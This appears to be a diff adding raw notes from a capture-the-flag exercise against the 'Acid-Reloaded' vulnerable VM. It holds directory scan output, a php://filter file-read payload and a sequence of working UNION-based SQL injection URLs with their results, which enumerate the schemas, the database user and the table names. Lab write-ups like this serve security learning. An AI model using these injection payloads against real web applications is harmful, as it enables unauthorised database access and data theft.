@@ -1,0 +1,106 @@
+
+
+    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
+   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
+  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
+ / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
+/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
+
+                                                                        -by Acid
+
+Wanna Knock me out ??? 
+3.2.1 Let's Start the Game.
+
+
+-----------------------------------------------
+
+port 33447
+
+----------------------------------------------
+
+
+http://10.0.0.141:33447/bin/includes/
+http://10.0.0.141:33447/bin/includes/validation.php
+http://10.0.0.141:33447/bin/includes/functions.php
+http://10.0.0.141:33447/bin/error.php?err=Test
+http://10.0.0.141:33447/bin/error.php
+
+http://10.0.0.141:33447/bin/.gitignore
+###################
+*~
+netbeans/*
+*#
+###################
+
+[15:38:01] Starting: 
+[15:38:01] 200 -    1KB - /bin/index.php
+[15:38:01] 200 -  309B  - /bin/error.php
+[17:38:02] 200 -  675B  - /bin/dashboard.php
+[15:39:04] 403 -  302B  - /bin/.htpasswds
+[15:39:53] 403 -  308B  - /bin/crack/.htpasswds
+[20:01:58] 302 -    0B  - /bin/includes/logout.php  ->  ../index.php
+[20:01:59] 302 -    0B  - /bin/includes/validation.php  ->  ../error.php?err=Could not process login
+
+
+
+
+
+---------------------------------------------
+
+
+# php://filter/convert.base64-encode/resource=index
+
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=%27
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''') ORDER BY Description ASC' at line 1
+
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=2-1
+
+
+
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1')union(select(null),(@@version)from(information_schema.tables)WHERE'a'='a
+
+
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,%28schema_name%29from%28information_schema.schemata%29WHERE%27a%27=%27a
+
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,%28table_name%29from%28information_schema.tables%29WHERE%27a%27=%27a
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,GROUP_CONCAT%28table_name%29from%28information_schema.tables%29WHERE%27a%27=%27a
+
+CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TAB
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,GROUP_CONCAT%28DISTINCT%28table_name%29%29from%28information_schema.tables%29WHERE%27a%27=%27a
+CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TAB
+
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,GROUP_CONCAT%28DISTINCT%28table_name%29%29from%28information_schema.columns%29WHERE%27a%27=%27a
+
+CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TAB
+
+
+
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,GROUP_CONCAT%28DISTINCT%28table_schema%29%29from%28information_schema.tables%29WHERE%27a%27=%27a
+
+information_schema,mysql,performance_schema,secure_login
+
+
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,GROUP_CONCAT%28DISTINCT%28table_schema%29%29from%28secure_login%29WHERE%27a%27=%27a
+Table 'secure_login.secure_login' doesn't exist
+
+
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,%28user%28%29%29from%28information_schema.columns%29WHERE%27Description%27LIKE%27Description
+root@localhost
+
+
+http://10.0.0.133:33447/bin/l33t_haxor.php?id=-1%27%29union%28select%28null%29,GROUP_CONCAT%28DISTINCT%28table_name%29%29from%28information_schema.columns%29WHERE%28table_schema%29=database%28%29AND%27Description%27LIKE%27Description
+
+UB3R/strcpy.exe,login_attempts,members,word
+
